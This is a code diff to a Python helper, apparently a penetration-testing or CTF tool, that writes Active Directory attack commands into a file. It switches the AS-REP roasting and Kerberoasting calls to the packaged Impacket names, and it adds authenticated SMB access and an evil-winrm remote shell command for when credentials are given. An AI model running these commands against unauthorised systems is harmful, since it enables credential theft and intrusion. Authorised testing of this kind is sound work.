@@ -55,17 +55,17 @@ def create_ad_enumeration_file(target_ip, hostname, domain, local_ip, user, pass
 
         # Write AS-Rep Roasting command
         f.write("# AS Rep Roasting\n")
-        f.write(f"for user in $(cat users.txt); do /usr/share/doc/python3-impacket/examples/GetNPUsers.py -no-pass -dc-ip {target_ip} {domain}/${{user}} | grep -v Impacket; done\n")
+        f.write(f"for user in $(cat users.txt); do impacket-GetNPUsers -no-pass -dc-ip {target_ip} {domain}/${{user}} | grep -v Impacket; done\n")
         f.write("\n")
 
         # Write Kerberoasting commands
         f.write("# Kerberoasting\n")
-        f.write(f"faketime -f +7h GetUserSPNs.py -target-domain {domain} -usersfile users.txt -dc-ip {hostname}.{domain} {domain}/guest -no-pass\n")
+        f.write(f"faketime -f +7h impacket-GetUserSPNs -target-domain {domain} -usersfile users.txt -dc-ip {hostname}.{domain} {domain}/guest -no-pass\n")
 
         if user and password:
-            f.write(f"faketime -f +7h GetUserSPNs.py -request -dc-ip {target_ip} {domain}/{user} -save -outputfile GetUserSPNs.out\n")
+            f.write(f"faketime -f +7h impacket-GetUserSPNs -request -dc-ip {target_ip} {domain}/{user} -save -outputfile GetUserSPNs.out\n")
 
-        f.write(f"GetUserSPNs.py -no-preauth '{user if user else 'guest'}' -usersfile 'users.txt' -dc-host '{hostname}.{domain}' '{domain}'/\n")
+        f.write(f"impacket-GetUserSPNs -no-preauth '{user if user else 'guest'}' -usersfile 'users.txt' -dc-host '{hostname}.{domain}' '{domain}'/\n")
         f.write("\n")
 
         # Write LDAP enumeration commands
@@ -114,11 +114,18 @@ def create_ad_enumeration_file(target_ip, hostname, domain, local_ip, user, pass
         if user and password:
             f.write("# SMB Enumeration with credentials\n")
             f.write(f"smbmap -u '{user}' -p '{password}' -H {target_ip}\n")
+            f.write(f"sudo smbclient //{target_ip}/example -U '{user}'%'{password}'\n")
         else:
             f.write("# SMB Enumeration\n")
             f.write(f"sudo smbclient -N -L //{target_ip}\n")
             f.write(f"smbmap -u '' -p '' -H {target_ip}\n")
         f.write("\n")
+
+        # Include WinRM Access command when creds are provided
+        if user and password:
+            f.write("# WinRM Access\n")
+            f.write(f"sudo evil-winrm -i {target_ip} -u {user} -p '{password}'\n")
+            f.write("\n")
 
     print("output.txt file generated successfully.")
 
